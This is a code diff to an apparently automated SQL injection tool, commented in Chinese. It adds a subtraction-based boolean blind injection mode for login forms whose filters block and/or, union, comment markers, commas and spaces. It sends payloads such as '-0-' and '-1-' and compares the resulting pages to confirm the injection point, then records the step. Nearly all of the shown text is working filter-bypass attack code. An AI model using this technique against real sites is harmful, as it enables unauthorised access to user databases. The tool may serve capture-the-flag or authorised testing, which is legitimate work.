@@ -48,6 +48,12 @@ class Detector:
 
     # ------------------------------------------------------------------ main
     def analyze(self) -> Optional[InjectionPoint]:
+        self.inj_result: Optional[InjectionPoint] = None
+        inj = self._analyze()
+        self.inj_result = inj
+        return inj
+
+    def _analyze(self) -> Optional[InjectionPoint]:
         spec = self.s.spec
         self.R_base = self._send(spec.base_value)
         if self.R_base.status_code < 0:
@@ -69,6 +75,18 @@ class Detector:
                 self.log("WARN", "未发现明显注入点（闭合探测无 SQL 报错，数字型布尔无差异）")
                 return None
         inj.form = self.form
+
+        if self.form == "arith":
+            # 减法盲注：尾部用 -' 引号闭合（替代被滤的 #/--），列数/回显探测
+            # 依赖 union+逗号（此形态下通常被滤）无意义，全部跳过。
+            # 基线换非数字串（数值化为 0）：'-expr-' 语义要求 0-expr-0——
+            # 数字基线 1 会让「表达式=0」页与「表不存在」页重合，存在性 oracle 失效
+            inj.comment = "minus-close"
+            if (inj.base_value or "").isdigit():
+                inj.base_value = MARKER_PREFIX
+            self.log("INFO", "减法盲注形态：尾部用 -' 引号闭合替代注释符，"
+                             f"基线值改为 {inj.base_value!r}（数值化 0）")
+            return inj
 
         # form 升级：classic 失效（关键字剥离/空格过滤）时按多形态重找可用恒真
         # （报错法命中闭合的场景 form 仍是 classic，WAF 剥离下 and/or 全灭）
@@ -104,7 +122,8 @@ class Detector:
         """逐一试探引号类闭合：
         1) 报错法：suffix 引发 SQL 报错即命中；
         2) 布尔法（LIMIT 拼接等环境下 1' 合法不报错）：
-           1{suffix} and 1=1# 与 1=2 页面有差异即命中。"""
+           1{suffix} and 1=1# 与 1=2 页面有差异即命中；
+        3) 减法布尔法（and/or/union/#/--/逗号/空格全被滤的登录框）。"""
         for suffix in ("'", '"', "')", '")', "`"):
             r = self._send(self.s.spec.base_value + suffix)
             if r.has_sql_error():
@@ -138,6 +157,29 @@ class Detector:
                         self.form = form
                         return suffix
                 continue
+        return self._probe_arith()
+
+    def _probe_arith(self) -> Optional[str]:
+        """减法布尔盲注（「都过滤了」类登录框）：and/or/union/#/--/逗号/空格
+        全被滤、但 - = ( ) 引号可用时，'-expr-'' 是仅存的布尔通道。
+        非数字字符串数值化为 0：表达式=0 匹配全部用户（密码错误页），
+        ≠0 无匹配（用户名错误页）。基线值数字 v 时 v-0 与 v-1 互补两态。"""
+        for suffix in ("'", '"'):
+            t = self._send(f"{self.s.spec.base_value}{suffix}-0-'")
+            f = self._send(f"{self.s.spec.base_value}{suffix}-1-'")
+            if t.status_code < 0 or f.status_code < 0:
+                continue
+            if self._differs(t, f) and                     (self._same_as_base(t, 0.98) or self._same_as_base(f, 0.98)):
+                self.log("INFO", f"命中闭合: {suffix!r}（减法布尔两态确认："
+                                 f"{suffix}-0- 与 {suffix}-1- 页面不同）")
+                self.s.record_step(
+                    "确认注入点（减法布尔盲注）",
+                    f"{self.s.spec.base_value}{suffix}-0-'",
+                    f"'xxx'-expr-'' 使 WHERE 变为数值比较：表达式为 0 匹配全部用户"
+                    f"（→密码错误页），非 0 无匹配（→用户名错误页）。"
+                    f"and/or/空格/注释符全被滤时唯一可用的布尔通道")
+                self.form = "arith"
+                return suffix
         return None
 
     def _probe_numeric(self) -> bool:
